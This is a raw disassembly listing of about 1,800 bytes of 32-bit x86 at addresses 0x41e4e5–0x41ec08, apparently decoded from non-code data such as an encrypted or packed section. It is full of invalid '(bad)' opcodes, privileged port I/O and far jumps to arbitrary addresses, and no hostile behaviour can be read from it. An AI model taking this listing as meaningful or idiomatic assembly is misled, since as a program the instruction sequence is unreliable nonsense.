  41e4e5:	fbld   TBYTE PTR [eax]
  41e4e7:	push   0x7d
  41e4e9:	mov    edx,gs
  41e4eb:	mov    esp,0x3a513965
  41e4f0:	scas   eax,DWORD PTR es:[edi]
  41e4f1:	rcl    al,cl
  41e4f3:	iret   
  41e4f4:	add    eax,0x5f98ff26
  41e4f9:	jae    0x41e54f
  41e4fb:	in     al,dx
  41e4fc:	mov    esi,0x986e3d29
  41e501:	popf   
  41e502:	or     DWORD PTR [esi+eiz*2+0x7198cdef],ebx
  41e509:	dec    ebp
  41e50a:	pop    DWORD PTR ds:0x1fc986ea
  41e510:	xor    DWORD PTR [ebx+0x25],ecx
  41e513:	xchg   ebp,eax
  41e514:	jecxz  0x41e4f3
  41e516:	out    0x65,eax
  41e518:	cmp    BYTE PTR [edx+0x2a48bf69],bl
  41e51e:	mov    ds:0xa361fe0d,eax
  41e523:	in     eax,0xf0
  41e525:	inc    ecx
  41e526:	outs   dx,DWORD PTR ds:[esi]
  41e527:	div    dh
  41e529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e52a:	push   ecx
  41e52b:	je     0x41e520
  41e52d:	sub    DWORD PTR [eax+0x17e3bb6b],ecx
  41e533:	test   BYTE PTR [ebp+0x64],dl
  41e536:	pop    ss
  41e537:	push   edx
  41e538:	or     bl,dl
  41e53a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e53b:	inc    ebx
  41e53c:	jmp    0x279b920b
  41e541:	add    cl,al
  41e543:	mov    ah,0xc3
  41e545:	shl    esi,1
  41e547:	out    0x31,eax
  41e549:	lods   eax,DWORD PTR ds:[esi]
  41e54a:	fisub  WORD PTR [esi+ebp*4]
  41e54d:	leave  
  41e54e:	push   esp
  41e54f:	mov    eax,ds:0x5c9d0581
  41e554:	fcmovbe st,st(1)
  41e556:	data16 (bad) 
  41e558:	push   0x1b06863d
  41e55d:	sti    
  41e55e:	je     0x41e4fd
  41e560:	push   ebp
  41e561:	dec    ecx
  41e562:	mov    ds:0x55f55137,al
  41e567:	sub    ch,BYTE PTR [esi+0x1206b712]
  41e56d:	dec    esp
  41e56e:	pop    esi
  41e56f:	add    cl,BYTE PTR [ecx-0x1731ec27]
  41e575:	(bad)  
  41e576:	bound  edi,QWORD PTR [ebp-0x24]
  41e579:	add    al,0x60
  41e57b:	mul    BYTE PTR [ecx+0x53]
  41e57e:	mov    dl,0x8
  41e580:	imul   esi,DWORD PTR [ecx-0xa],0x88d98aa9
  41e587:	add    BYTE PTR [edx+0x5a],dh
  41e58a:	push   DWORD PTR [esi+0x54]
  41e58d:	je     0x41e5fe
  41e58f:	pushf  
  41e590:	cmc    
  41e591:	push   edi
  41e592:	scas   al,BYTE PTR es:[edi]
  41e593:	in     eax,dx
  41e594:	cmp    BYTE PTR [ebp-0x15],bl
  41e597:	push   ecx
  41e598:	pop    ecx
  41e599:	adc    eax,0x15eb4636
  41e59e:	stos   BYTE PTR es:[edi],al
  41e59f:	loopne 0x41e581
  41e5a1:	mov    ds:0x364af8dd,eax
  41e5a6:	inc    edi
  41e5a7:	test   BYTE PTR [ebp-0x703ca613],al
  41e5ad:	dec    edx
  41e5ae:	inc    edi
  41e5af:	repnz pop esi
  41e5b1:	dec    edx
  41e5b2:	jl     0x41e543
  41e5b4:	mov    ebp,0xd7c763b8
  41e5b9:	mov    ecx,0x1d950331
  41e5be:	js     0x41e5f9
  41e5c0:	jbe    0x41e5f9
  41e5c2:	mov    bl,0x1b
  41e5c4:	xchg   edx,eax
  41e5c5:	pop    esp
  41e5c6:	jmp    0x7221:0x6ef70473
  41e5cd:	xchg   esi,eax
  41e5ce:	sub    eax,0xcab4020
  41e5d3:	outs   dx,DWORD PTR ds:[esi]
  41e5d4:	lahf   
  41e5d5:	pushf  
  41e5d6:	aam    0x23
  41e5d8:	popa   
  41e5d9:	sub    DWORD PTR [ebx+0x398c5c97],ebx
  41e5df:	ss imul ebp,DWORD PTR fs:[ecx+0x46],0xe4238375
  41e5e8:	mov    ch,0xe5
  41e5ea:	lods   al,BYTE PTR ds:[esi]
  41e5eb:	outs   dx,BYTE PTR ds:[esi]
  41e5ec:	sbb    edx,DWORD PTR [edi]
  41e5ee:	xchg   BYTE PTR [ecx+edx*2+0x1f72a079],bh
  41e5f5:	stos   BYTE PTR es:[edi],al
  41e5f6:	add    bl,BYTE PTR [edx-0x6558eec1]
  41e5fc:	xchg   ecx,eax
  41e5fd:	es ins BYTE PTR es:[edi],dx
  41e5ff:	sahf   
  41e600:	jb     0x41e5fb
  41e602:	xor    dh,BYTE PTR [esi+0x55]
  41e605:	imul   ebx,DWORD PTR [ecx+0x7d],0xb18c3ff3
  41e60c:	stos   DWORD PTR es:[edi],eax
  41e60d:	adc    ch,ah
  41e60f:	xchg   ebp,eax
  41e610:	pop    esp
  41e611:	adc    al,0x6e
  41e613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e614:	xchg   ebp,eax
  41e615:	cmc    
  41e616:	adc    BYTE PTR [eax-0xf6e463e],bh
  41e61c:	mov    dh,0x2b
  41e61e:	pop    eax
  41e61f:	shl    DWORD PTR [ebx],1
  41e621:	jbe    0x41e5c3
  41e623:	add    dl,cl
  41e625:	in     eax,dx
  41e626:	mov    ebp,0x4837c755
  41e62b:	inc    eax
  41e62c:	add    DWORD PTR ds:0xf7519f72,ecx
  41e632:	shl    ebx,0x6
  41e635:	sbb    BYTE PTR [eax+eax*8+0x19],bl
  41e639:	or     BYTE PTR [esi+eiz*1],ch
  41e63c:	ja     0x41e5d6
  41e63e:	or     esp,esp
  41e640:	clc    
  41e641:	ins    BYTE PTR es:[edi],dx
  41e642:	or     al,0x7e
  41e644:	push   ebx
  41e645:	and    cl,BYTE PTR [esp+ebp*2-0x3e8055e7]
  41e64c:	ins    BYTE PTR es:[edi],dx
  41e64d:	sti    
  41e64e:	add    al,0xc3
  41e650:	pop    ds
  41e651:	ins    DWORD PTR es:[edi],dx
  41e652:	loop   0x41e673
  41e654:	ins    DWORD PTR es:[edi],dx
  41e655:	push   eax
  41e656:	dec    ebx
  41e657:	outs   dx,DWORD PTR ds:[esi]
  41e658:	iret   
  41e659:	jne    0x41e60c
  41e65b:	mov    edi,DWORD PTR [edx+0x61a2434d]
  41e661:	in     eax,dx
  41e662:	push   esp
  41e663:	xor    BYTE PTR [eax],bl
  41e665:	in     eax,0x73
  41e667:	cmc    
  41e668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e669:	or     BYTE PTR [edx-0x6a],bl
  41e66c:	sbb    eax,0x1e37e74f
  41e671:	push   es
  41e672:	in     eax,0xb0
  41e674:	and    BYTE PTR [ecx-0x29],bl
  41e677:	jge    0x41e6ec
  41e679:	pop    ebx
  41e67a:	and    dh,BYTE PTR [ebp+0x44]
  41e67d:	push   ebp
  41e67e:	dec    esi
  41e67f:	xchg   bl,dh
  41e681:	rol    BYTE PTR [esi+0xb0fb6ed],1
  41e687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e688:	jne    0x41e61c
  41e68a:	or     ch,ah
  41e68c:	push   ebx
  41e68d:	push   ebp
  41e68e:	(bad)  
  41e68f:	mov    eax,ds:0x48d5eb8a
  41e694:	out    dx,al
  41e695:	xchg   ebx,eax
  41e696:	or     ch,BYTE PTR es:[edi-0x1efb6a8a]
  41e69d:	adc    BYTE PTR [ecx+0x3e],ah
  41e6a0:	or     al,0xd4
  41e6a2:	aaa    
  41e6a3:	xchg   edx,eax
  41e6a4:	and    al,0x6f
  41e6a6:	sbb    eax,eax
  41e6a8:	adc    al,0xb7
  41e6aa:	jg     0x41e644
  41e6ac:	cwde   
  41e6ad:	test   DWORD PTR [ecx+0x6992861d],ebx
  41e6b3:	xchg   esi,eax
  41e6b4:	and    esp,eax
  41e6b6:	mov    bl,0x7e
  41e6b8:	cmp    edi,DWORD PTR [ebx+ecx*8+0x61]
  41e6bc:	mov    edx,DWORD PTR [edi+0x25b6846a]
  41e6c2:	xchg   esi,eax
  41e6c3:	sahf   
  41e6c4:	mov    dh,0x22
  41e6c6:	add    DWORD PTR [eax+0x43d7e8df],ecx
  41e6cc:	add    ecx,DWORD PTR [ecx-0x18dc3a9]
  41e6d2:	mov    dh,BYTE PTR [ebx]
  41e6d4:	mov    edx,0x2244bf09
  41e6d9:	xor    eax,0x4370f334
  41e6de:	out    dx,al
  41e6df:	pop    edi
  41e6e0:	mov    eax,esi
  41e6e2:	iret   
  41e6e3:	mov    DWORD PTR [ecx],ecx
  41e6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6e6:	(bad)  
  41e6e8:	jae    0x41e695
  41e6ea:	out    dx,al
  41e6eb:	imul   ebx,eax,0x51
  41e6ee:	sahf   
  41e6ef:	cmp    DWORD PTR [eax],eax
  41e6f1:	mov    eax,ds:0x6bb8c377
  41e6f6:	mov    ds:0x98aeceea,eax
  41e6fb:	sub    al,0xc1
  41e6fd:	push   ds
  41e6fe:	mov    ecx,0x38847aa5
  41e703:	popf   
  41e704:	(bad)  
  41e706:	xor    al,0xf
  41e708:	mov    esi,0x4660bb88
  41e70d:	sbb    bh,al
  41e70f:	mov    edi,0x649c09b9
  41e714:	ficomp DWORD PTR [ebx]
  41e716:	or     bh,BYTE PTR [ebx+edi*1]
  41e719:	(bad)  
  41e71a:	arpl   sp,bp
  41e71c:	jbe    0x41e73c
  41e71e:	jb     0x41e6ab
  41e720:	cli    
  41e721:	mov    edx,0x385bfa09
  41e726:	push   esi
  41e727:	xchg   ebp,eax
  41e728:	stc    
  41e729:	aaa    
  41e72a:	xchg   esi,eax
  41e72b:	mov    cl,0xac
  41e72d:	ja     0x41e6ee
  41e72f:	xor    esi,ebp
  41e731:	pop    ds
  41e732:	and    DWORD PTR [esi+edx*1+0x124ec8a1],ebp
  41e739:	stc    
  41e73a:	sub    BYTE PTR [ecx],ah
  41e73c:	cmp    BYTE PTR [edi-0x61],dh
  41e73f:	aam    0xa
  41e741:	jae    0x41e74c
  41e743:	pop    ds
  41e744:	sbb    DWORD PTR [edx-0x21],esi
  41e747:	pop    esp
  41e748:	inc    eax
  41e749:	mov    ecx,DWORD PTR [ebx+0x15f87dcc]
  41e74f:	cmp    ebp,ecx
  41e751:	lods   al,BYTE PTR ds:[esi]
  41e752:	mov    esi,0x8be1ca9a
  41e757:	and    ebx,DWORD PTR [ebp-0x76]
  41e75a:	int    0xea
  41e75c:	adc    DWORD PTR [edi-0x70baf046],0xf5ddce26
  41e766:	loope  0x41e760
  41e768:	popf   
  41e769:	call   0x8074:0xb626f3d8
  41e770:	sub    al,0xfe
  41e772:	lock xchg edx,eax
  41e774:	loop   0x41e7a3
  41e776:	and    edx,DWORD PTR [ebx-0x2e]
  41e779:	out    dx,eax
  41e77a:	dec    esi
  41e77b:	xchg   ebp,eax
  41e77c:	js     0x41e7e1
  41e77e:	imul   esp,DWORD PTR [ecx],0xffffffb9
  41e781:	pop    ebp
  41e782:	enter  0x109,0x92
  41e786:	pop    esi
  41e787:	cmp    eax,DWORD PTR [eax]
  41e789:	xor    DWORD PTR [esi+0x2f],ecx
  41e78c:	gs jmp 0x41e74c
  41e78f:	adc    DWORD PTR [ebp+0x5c],ecx
  41e792:	or     esi,ecx
  41e794:	enter  0xba59,0xd4
  41e798:	call   0xe58d:0x3851
  41e79e:	or     al,0x3d
  41e7a0:	sub    eax,0xda50c41d
  41e7a5:	or     edx,ecx
  41e7a7:	sub    ebp,DWORD PTR [ecx-0x5c229654]
  41e7ad:	adc    ebp,0xffffffc9
  41e7b0:	in     eax,0xa5
  41e7b2:	push   edx
  41e7b3:	or     ebx,DWORD PTR [esi+0x22a263d1]
  41e7b9:	ins    DWORD PTR es:[edi],dx
  41e7ba:	mov    DWORD PTR [eax+0x275beecb],ecx
  41e7c0:	dec    ebp
  41e7c1:	cli    
  41e7c2:	dec    ecx
  41e7c3:	shl    DWORD PTR [ebx+0x46],1
  41e7c6:	into   
  41e7c7:	je     0x41e7e3
  41e7c9:	ins    DWORD PTR es:[edi],dx
  41e7ca:	shl    BYTE PTR [ebx],0x66
  41e7cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ce:	in     eax,dx
  41e7cf:	dec    ebp
  41e7d0:	fmul   st,st(3)
  41e7d2:	hlt    
  41e7d3:	stos   DWORD PTR es:[edi],eax
  41e7d4:	mul    dl
  41e7d6:	jo     0x41e7e2
  41e7d8:	sbb    bl,BYTE PTR [ebx-0x2c290ac1]
  41e7de:	das    
  41e7df:	mov    ch,0x1d
  41e7e1:	mov    ah,0xf8
  41e7e3:	inc    ebp
  41e7e4:	(bad)  
  41e7e6:	fwait
  41e7e7:	add    DWORD PTR [ecx-0x4d72f4de],ecx
  41e7ed:	cmc    
  41e7ee:	into   
  41e7ef:	call   0x99b1:0xe1ef8b90
  41e7f6:	out    0x0,eax
  41e7f8:	dec    ecx
  41e7f9:	shr    DWORD PTR [ecx],1
  41e7fb:	lahf   
  41e7fc:	(bad)  
  41e7fd:	jge    0x41e7c6
  41e7ff:	pop    ebx
  41e800:	jg     0x41e87b
  41e802:	aad    0x4c
  41e804:	push   eax
  41e805:	sbb    eax,0xe5849bde
  41e80a:	adc    cl,0xe3
  41e80d:	jmp    0x61656ade
  41e812:	pop    ebp
  41e813:	push   es
  41e814:	xchg   edx,eax
  41e815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e816:	je     0x41e7e1
  41e818:	rcl    DWORD PTR [eax-0x2e44fe29],1
  41e81e:	jl     0x41e84e
  41e820:	retf   
  41e821:	sbb    ecx,DWORD PTR [esi-0x7a74578d]
  41e827:	sub    bh,ah
  41e829:	and    esi,DWORD PTR [ebx]
  41e82b:	ins    DWORD PTR es:[edi],dx
  41e82c:	cmp    eax,0xa4f75f33
  41e831:	sbb    dh,BYTE PTR [ecx]
  41e833:	(bad)  
  41e834:	jnp    0x41e7b6
  41e836:	cs std 
  41e838:	dec    eax
  41e839:	fsubr  st(3),st
  41e83b:	cmp    DWORD PTR [ebx+edx*4-0x38],ebx
  41e83f:	cwde   
  41e840:	add    DWORD PTR [ebp+0x7227e044],ebx
  41e846:	lds    ebp,FWORD PTR [edx-0x64]
  41e849:	cmp    eax,DWORD PTR [ebx+edi*8-0x453e096d]
  41e850:	out    dx,eax
  41e851:	mov    al,ds:0xf45cdf1e
  41e856:	(bad)  
  41e857:	test   DWORD PTR [eax+0xe],0x6606ccb8
  41e85e:	jae    0x41e8c3
  41e860:	add    ecx,DWORD PTR [ebp-0x50]
  41e863:	add    DWORD PTR ds:0x777ef5a0,ecx
  41e869:	jns    0x41e8b8
  41e86b:	sbb    eax,edx
  41e86d:	or     ah,bl
  41e86f:	fucompp 
  41e871:	cs (bad) 
  41e873:	out    dx,al
  41e874:	xor    al,0x12
  41e876:	jne    0x41e80e
  41e878:	idiv   BYTE PTR [edx-0x57]
  41e87b:	inc    ecx
  41e87c:	sub    BYTE PTR [eax],ch
  41e87e:	jnp    0x41e89e
  41e880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e881:	jle    0x41e805
  41e883:	into   
  41e884:	mov    bh,0xab
  41e887:	call   0xdaaf:0xf7eb8011
  41e88e:	lahf   
  41e88f:	sub    ebp,DWORD PTR [edi]
  41e891:	push   edx
  41e892:	inc    eax
  41e893:	fidivr DWORD PTR [esi+ebx*4-0x32]
  41e897:	mov    BYTE PTR [edx-0x5a5a4706],bl
  41e89d:	mov    bl,0xa4
  41e89f:	push   ss
  41e8a0:	lock push ds
  41e8a2:	call   0xe620a967
  41e8a7:	out    dx,al
  41e8a8:	cs inc ebp
  41e8aa:	sbb    ecx,edi
  41e8ac:	jo     0x41e914
  41e8ae:	xlat   BYTE PTR ds:[ebx]
  41e8af:	into   
  41e8b0:	imul   edi,DWORD PTR [edx+0x54],0x244ba5ec
  41e8b7:	idiv   BYTE PTR [edi+0x3637c011]
  41e8bd:	sub    al,0xe2
  41e8bf:	adc    al,0xf5
  41e8c1:	stos   DWORD PTR es:[edi],eax
  41e8c2:	dec    DWORD PTR [ebx+0x1]
  41e8c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8c6:	(bad)  
  41e8c7:	aas    
  41e8c8:	mov    esi,0xdd7b666f
  41e8cd:	retf   
  41e8ce:	repz cdq 
  41e8d0:	ret    0x60b8
  41e8d3:	jb     0x41e8c7
  41e8d5:	(bad)  
  41e8d6:	mov    edi,0x6bac11dd
  41e8db:	xor    al,0x30
  41e8dd:	sar    esi,0x43
  41e8e0:	mov    cl,0xcd
  41e8e2:	xor    DWORD PTR [eax-0x76],esi
  41e8e5:	call   0x896c:0xa7ed476a
  41e8ec:	or     BYTE PTR [edx+0x17],dl
  41e8ef:	mov    ds:0x6fb81b1e,al
  41e8f4:	je     0x41e8d6
  41e8f6:	stos   BYTE PTR es:[edi],al
  41e8f7:	inc    esi
  41e8f8:	lds    ebp,FWORD PTR [eax+0x3a]
  41e8fb:	fldcw  WORD PTR [ebx-0x23]
  41e8fe:	mov    DWORD PTR [ebp-0x5bef2e2e],ebp
  41e904:	mov    DWORD PTR ss:[ebx+0x22843538],ebp
  41e90b:	push   edx
  41e90c:	adc    ah,al
  41e90e:	mov    ch,0x8e
  41e910:	mov    ah,0x6b
  41e912:	inc    ebp
  41e913:	fcomip st,st(2)
  41e915:	push   ebp
  41e916:	(bad)  
  41e917:	lods   al,BYTE PTR ds:[esi]
  41e918:	mov    WORD PTR [esi],?
  41e91a:	cmp    al,0x9e
  41e91c:	cwde   
  41e91d:	je     0x41e93b
  41e91f:	add    eax,0xc69e1188
  41e924:	out    dx,al
  41e925:	jmp    0x41e8d9
  41e927:	push   es
  41e928:	mov    ch,0x3f
  41e92a:	sbb    al,0x27
  41e92c:	jle    0x41e8ca
  41e92e:	lea    edx,[ebp+0x21]
  41e931:	retf   0x3bce
  41e934:	cmp    ch,BYTE PTR [ebx+esi*1+0x39]
  41e938:	xchg   ecx,eax
  41e939:	mov    esp,0xdaeff534
  41e93e:	or     DWORD PTR [edi-0x796d2a34],ebp
  41e944:	push   ecx
  41e945:	scas   al,BYTE PTR es:[edi]
  41e946:	and    DWORD PTR [esi+0x195ff59a],esi
  41e94c:	jle    0x41e975
  41e94e:	sbb    cl,BYTE PTR [ebp-0x1a]
  41e951:	test   DWORD PTR [ebp-0x5f],0xde2d585e
  41e958:	je     0x41e9a3
  41e95a:	repnz in eax,0x16
  41e95d:	pop    ds
  41e95e:	retf   
  41e95f:	push   edi
  41e960:	add    esp,ebp
  41e962:	cmp    al,BYTE PTR [esi-0x1c]
  41e965:	pop    ss
  41e966:	adc    bl,BYTE PTR [ecx-0x32]
  41e969:	mov    DWORD PTR [eax-0x314328e],ebx
  41e96f:	rcl    DWORD PTR [ecx],1
  41e971:	jnp    0x41e9d8
  41e973:	or     eax,0xa41aa897
  41e978:	inc    esi
  41e979:	xor    DWORD PTR [edi-0xc],ecx
  41e97c:	in     al,dx
  41e97d:	mov    al,ds:0xb9190fce
  41e982:	(bad)  
  41e983:	mov    eax,0xe184eae8
  41e988:	mov    eax,0xc280e48a
  41e98d:	mov    al,0xd7
  41e98f:	mov    ebx,0xa4b16af4
  41e994:	scas   eax,DWORD PTR es:[edi]
  41e995:	leave  
  41e996:	pop    esp
  41e997:	add    DWORD PTR [edx],edx
  41e999:	cmp    al,0x47
  41e99b:	dec    edx
  41e99c:	push   ebp
  41e99d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e99e:	es int3 
  41e9a0:	and    al,0x84
  41e9a2:	pop    ds
  41e9a3:	cs jns 0x41e983
  41e9a6:	and    BYTE PTR [ecx-0x6e03b6a7],dh
  41e9ac:	fadd   st(1),st
  41e9ae:	push   ebp
  41e9af:	sbb    al,bl
  41e9b1:	xlat   BYTE PTR ds:[ebx]
  41e9b2:	and    ch,BYTE PTR [ecx-0x37]
  41e9b5:	push   esp
  41e9b6:	popa   
  41e9b7:	std    
  41e9b8:	std    
  41e9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9ba:	jnp    0x41ea19
  41e9bc:	sub    al,0x78
  41e9be:	mov    ebx,DWORD PTR [edx+0x64bc42b9]
  41e9c4:	iret   
  41e9c5:	xor    al,0x14
  41e9c7:	add    eax,0x57231194
  41e9cc:	push   DWORD PTR [edi]
  41e9ce:	mov    eax,ds:0x1282213
  41e9d3:	jno    0x41e9df
  41e9d5:	xor    ch,al
  41e9d7:	cwde   
  41e9d8:	dec    esi
  41e9d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9da:	mov    BYTE PTR [ebx],cl
  41e9dc:	pop    ebx
  41e9dd:	popa   
  41e9de:	jo     0x41ea2a
  41e9e0:	sub    ecx,0xffffffe4
  41e9e3:	mov    ds:0x89bba522,al
  41e9e8:	retf   0x93af
  41e9eb:	dec    esi
  41e9ec:	out    dx,al
  41e9ed:	mov    eax,0xe5188fc3
  41e9f2:	cli    
  41e9f3:	pop    ebp
  41e9f4:	sbb    BYTE PTR [edi],dl
  41e9f6:	jmp    DWORD PTR [ebx-0x2b]
  41e9f9:	mov    edx,0x95d3183b
  41e9fe:	test   ah,al
  41ea00:	aas    
  41ea01:	pop    ecx
  41ea02:	add    ah,BYTE PTR [ebx+0x26aaacf9]
  41ea08:	es jne 0x41e9c2
  41ea0b:	in     al,dx
  41ea0c:	mov    edi,0xefdb5c36
  41ea11:	mov    DWORD PTR [ebp+0x2ffd24d6],ebx
  41ea17:	mov    fs,WORD PTR [esi-0x36]
  41ea1a:	call   0x8f1eec60
  41ea1f:	bound  esp,QWORD PTR [edi]
  41ea21:	lods   eax,DWORD PTR ds:[esi]
  41ea22:	les    edi,FWORD PTR [esi+0x5a]
  41ea25:	lods   al,BYTE PTR ds:[esi]
  41ea26:	ins    BYTE PTR es:[edi],dx
  41ea27:	aad    0xb3
  41ea29:	(bad)  
  41ea2a:	hlt    
  41ea2b:	jnp    0x41ea02
  41ea2d:	sar    DWORD PTR [ebx+0x67],0x7c
  41ea31:	lds    esp,FWORD PTR [esi+0x302cca4b]
  41ea37:	cmp    eax,0xc5de979d
  41ea3c:	in     eax,0x4a
  41ea3e:	sbb    al,BYTE PTR [esi-0x71485cca]
  41ea44:	xchg   edi,eax
  41ea45:	js     0x41ea15
  41ea47:	or     BYTE PTR [eax-0x51],bl
  41ea4a:	push   ebp
  41ea4b:	cs pop ss
  41ea4d:	mul    DWORD PTR [edx+0x2a]
  41ea50:	loope  0x41eab0
  41ea52:	(bad)  
  41ea53:	fisub  DWORD PTR [edi+eiz*2]
  41ea56:	pop    ecx
  41ea57:	jo     0x41ea16
  41ea59:	fistp  DWORD PTR [eax+0x6c]
  41ea5c:	ror    DWORD PTR [ebp+0x7deabbad],1
  41ea62:	dec    ebp
  41ea63:	mov    ebp,0x6a29333d
  41ea68:	cli    
  41ea69:	scas   eax,DWORD PTR es:[edi]
  41ea6a:	gs cli 
  41ea6c:	mov    al,0x92
  41ea6e:	pop    ecx
  41ea6f:	cmp    dh,al
  41ea71:	mov    ch,BYTE PTR [esi]
  41ea73:	jge    0x41ea92
  41ea75:	fnstcw WORD PTR [ecx+0x15]
  41ea78:	dec    edi
  41ea79:	enter  0x62a2,0xa
  41ea7d:	jb     0x41eabb
  41ea7f:	(bad)  
  41ea80:	pop    ebx
  41ea81:	push   ds
  41ea82:	push   ecx
  41ea83:	push   ds
  41ea84:	ins    BYTE PTR es:[edi],dx
  41ea85:	lods   al,BYTE PTR ds:[esi]
  41ea86:	and    BYTE PTR [ebx+0x7ccc230b],0x79
  41ea8d:	out    0xe1,eax
  41ea8f:	clc    
  41ea90:	sar    DWORD PTR [edi],1
  41ea92:	outs   dx,BYTE PTR ds:[esi]
  41ea93:	mov    DWORD PTR [ebp-0x4cf3a070],0x4ceea503
  41ea9d:	out    0x96,al
  41ea9f:	sti    
  41eaa0:	mov    DWORD PTR [edx-0x1b],eax
  41eaa3:	sbb    al,0x66
  41eaa5:	fistp  DWORD PTR [esi+edi*2]
  41eaa8:	xor    DWORD PTR [esi-0x343e3a47],esi
  41eaae:	or     DWORD PTR ds:0x759bf6a0,ebx
  41eab4:	mov    edx,0x26fc0357
  41eab9:	vpaddd xmm4,xmm7,XMMWORD PTR [ebx-0x59]
  41eabe:	inc    ebx
  41eabf:	lods   eax,DWORD PTR ds:[esi]
  41eac0:	add    BYTE PTR [ebx+0x6c],bh
  41eac3:	shr    BYTE PTR [ebp+0x66],cl
  41eac6:	mov    bh,0xd2
  41eac8:	jo     0x41eb35
  41eaca:	mov    edx,0x83afd4fd
  41eacf:	imul   esp,DWORD PTR [esi+0xf],0x620de23b
  41ead6:	mov    ds:0xbc443ed1,eax
  41eadb:	lahf   
  41eadc:	push   ebx
  41eadd:	stc    
  41eade:	mov    ebp,0x3f1fae22
  41eae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eae4:	mov    edi,0x443647f2
  41eae9:	cwde   
  41eaea:	aas    
  41eaeb:	cmc    
  41eaec:	dec    eax
  41eaed:	repnz mov eax,0x99440cdb
  41eaf3:	jle    0x41eb09
  41eaf5:	mov    esi,0x61c09869
  41eafa:	jmp    0xff7f:0xdae9202d
  41eb01:	jg     0x41ea9b
  41eb03:	repnz shr BYTE PTR [ebp+0x123e8e1c],1
  41eb0a:	call   0xc0d7:0x365ed8d
  41eb11:	xchg   edx,eax
  41eb12:	xor    al,BYTE PTR [edi-0x3cf802c9]
  41eb18:	retf   0xc283
  41eb1b:	or     eax,0x778d4fb5
  41eb20:	cmp    eax,0x5de0dc73
  41eb25:	push   0x5224f093
  41eb2a:	outs   dx,BYTE PTR ds:[esi]
  41eb2b:	(bad)  
  41eb2c:	and    ah,BYTE PTR [eax]
  41eb2e:	mov    esi,0xa3826082
  41eb33:	dec    ecx
  41eb34:	xor    BYTE PTR [ebp-0x3e],bh
  41eb37:	fldcw  WORD PTR [esi]
  41eb39:	das    
  41eb3a:	add    bl,BYTE PTR [ebx-0x30]
  41eb3d:	jg     0x41eb7e
  41eb3f:	dec    esp
  41eb40:	int3   
  41eb41:	pop    edx
  41eb42:	xlat   BYTE PTR ds:[ebx]
  41eb43:	push   edi
  41eb44:	pop    ss
  41eb45:	daa    
  41eb46:	xor    al,0x7
  41eb48:	dec    edx
  41eb49:	inc    esp
  41eb4a:	test   eax,ebp
  41eb4c:	icebp  
  41eb4d:	call   0x8e84abd2
  41eb52:	push   ecx
  41eb53:	lock xchg esp,eax
  41eb55:	inc    ecx
  41eb56:	inc    esp
  41eb57:	xlat   BYTE PTR ds:[ebx]
  41eb58:	outs   dx,BYTE PTR ds:[esi]
  41eb59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb5a:	sahf   
  41eb5b:	aaa    
  41eb5c:	pop    esp
  41eb5d:	push   cs
  41eb5e:	jo     0x41eb88
  41eb60:	gs test eax,0xdcd00c55
  41eb66:	dec    ebp
  41eb67:	retf   
  41eb68:	xor    bh,BYTE PTR [ecx]
  41eb6a:	arpl   WORD PTR [ecx],di
  41eb6c:	pushf  
  41eb6d:	scas   al,BYTE PTR es:[edi]
  41eb6e:	sti    
  41eb6f:	and    eax,0xeb1af4af
  41eb74:	fadd   QWORD PTR [esi+edx*4+0x4946d907]
  41eb7b:	fistp  DWORD PTR [ebp-0x38]
  41eb7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb7f:	aas    
  41eb80:	mov    eax,ds:0x456e65ba
  41eb85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb86:	dec    ebp
  41eb87:	cmp    BYTE PTR [edx+0x79e14f8b],0x61
  41eb8e:	mov    dl,0xfa
  41eb90:	sbb    al,0xec
  41eb92:	pop    DWORD PTR [ecx+0x4]
  41eb95:	das    
  41eb96:	xchg   BYTE PTR cs:[edx-0x66],ah
  41eb9a:	mov    ecx,0x589b39d2
  41eb9f:	rol    DWORD PTR fs:0xbd00e4bb,0xa6
  41eba7:	(bad)  
  41eba8:	cmp    al,0x58
  41ebaa:	nop
  41ebab:	popa   
  41ebac:	div    DWORD PTR [esi-0x6c641098]
  41ebb2:	adc    edx,DWORD PTR [edx]
  41ebb4:	test   al,0x2e
  41ebb6:	out    dx,al
  41ebb7:	js     0x41eb72
  41ebb9:	mov    cl,0xc3
  41ebbb:	lods   eax,DWORD PTR ds:[esi]
  41ebbc:	cwde   
  41ebbd:	test   al,0xe5
  41ebbf:	sub    ebp,DWORD PTR [ecx]
  41ebc1:	cmp    ebp,edi
  41ebc3:	push   esp
  41ebc4:	cmc    
  41ebc5:	jecxz  0x41eb96
  41ebc7:	jle    0x41ec2e
  41ebc9:	aaa    
  41ebca:	in     eax,dx
  41ebcb:	mov    ah,0x63
  41ebcd:	jb     0x41ebc1
  41ebcf:	mov    DWORD PTR [edi],edx
  41ebd1:	mov    bh,BYTE PTR [ebx+0x2b]
  41ebd4:	adc    al,0xcf
  41ebd6:	or     eax,0xeb021478
  41ebdb:	mov    al,ds:0xdc7f0705
  41ebe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebe1:	inc    ebx
  41ebe2:	lock mov ds:0x6b2f5d19,eax
  41ebe8:	mov    edx,0xf7791a4c
  41ebed:	sub    DWORD PTR [ecx+0xa],edx
  41ebf0:	call   0x98ee:0xfe43e540
  41ebf7:	and    cl,dl
  41ebf9:	jge    0x41ec6a
  41ebfb:	jecxz  0x41eba7
  41ebfd:	xchg   ebx,eax
  41ebfe:	aad    0x5
  41ec00:	inc    eax
  41ec01:	mov    cl,BYTE PTR [edx]
  41ec03:	mov    esi,0x45bb6434
  41ec08:	das    
